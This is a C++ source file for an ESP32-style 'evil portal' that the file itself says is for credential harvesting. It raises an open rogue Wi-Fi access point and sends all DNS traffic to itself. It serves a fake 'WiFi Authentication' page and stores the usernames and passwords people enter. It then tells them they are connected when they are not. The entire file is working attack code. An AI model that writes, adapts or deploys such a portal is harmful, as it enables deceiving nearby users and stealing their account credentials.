/*
 * ============================================================
 *  GhostNet — evil_portal.cpp
 *  Captive Portal with DNS Redirection & Credential Harvesting
 * ============================================================
 */

#include "evil_portal.h"
#include "utils.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

static DNSServer dnsServer;
static WebServer webServer(80);

const char EvilPortal::PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:25px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:100%;max-width:340px;text-align:center}
h2{margin-top:0;color:#1a73e8}
p{color:#5f6368;font-size:14px}
input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:14px}
button{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
button:hover{background:#1557b0}
</style>
</head>
<body>
<div class="card">
<h2>WiFi Authentication</h2>
<p>Sign in to access high-speed internet.</p>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Email / Username" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>
)rawliteral";

EvilPortal::EvilPortal() {
  _running = false;
  _clientCount = 0;
  _credCount = 0;
  strcpy(_ssid, PORTAL_SSID);
  memset(_creds, 0, sizeof(_creds));
}

void EvilPortal::start(const char* ssid) {
  if (ssid && strlen(ssid) > 0) {
    strncpy(_ssid, ssid, 32);
    _ssid[32] = '\0';
  }

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(_ssid, nullptr, PORTAL_CHANNEL);

  _setupDNS();
  _setupWebServer();

  _running = true;
  _clientCount = 0;
}

void EvilPortal::stop() {
  if (!_running) return;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  _running = false;
}

void EvilPortal::_setupDNS() {
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
}

void EvilPortal::_setupWebServer() {
  webServer.on("/", HTTP_GET, [this]() {
    webServer.send_P(200, "text/html", PORTAL_HTML);
  });

  webServer.on("/login", HTTP_POST, [this]() {
    String u = webServer.arg("username");
    String p = webServer.arg("password");

    if (_credCount < MAX_CREDENTIALS) {
      strncpy(_creds[_credCount].username, u.c_str(), 63);
      _creds[_credCount].username[63] = '\0';
      strncpy(_creds[_credCount].password, p.c_str(), 63);
      _creds[_credCount].password[63] = '\0';
      strncpy(_creds[_credCount].timestamp, formatUptime(millis()).c_str(), 11);
      _creds[_credCount].timestamp[11] = '\0';
      _credCount++;
    }

    String resp = "<html><body style='font-family:sans-serif;text-align:center;padding:50px;'>"
                  "<h2>Connecting...</h2><p>Authentication successful. You are now connected to the internet.</p></body></html>";
    webServer.send(200, "text/html", resp);
  });

  webServer.onNotFound([this]() {
    webServer.sendHeader("Location", "http://192.168.4.1/", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
}

void EvilPortal::handleClient() {
  if (!_running) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  _clientCount = WiFi.softAPgetStationNum();
}

bool EvilPortal::isRunning() const { return _running; }
int EvilPortal::getClientCount() const { return _clientCount; }
int EvilPortal::getCredCount() const { return _credCount; }
CapturedCred* EvilPortal::getCred(int index) {
  if (index >= 0 && index < _credCount) return &_creds[index];
  return nullptr;
}
CapturedCred* EvilPortal::getCreds() { return _creds; }
const char* EvilPortal::getSSID() const { return _ssid; }
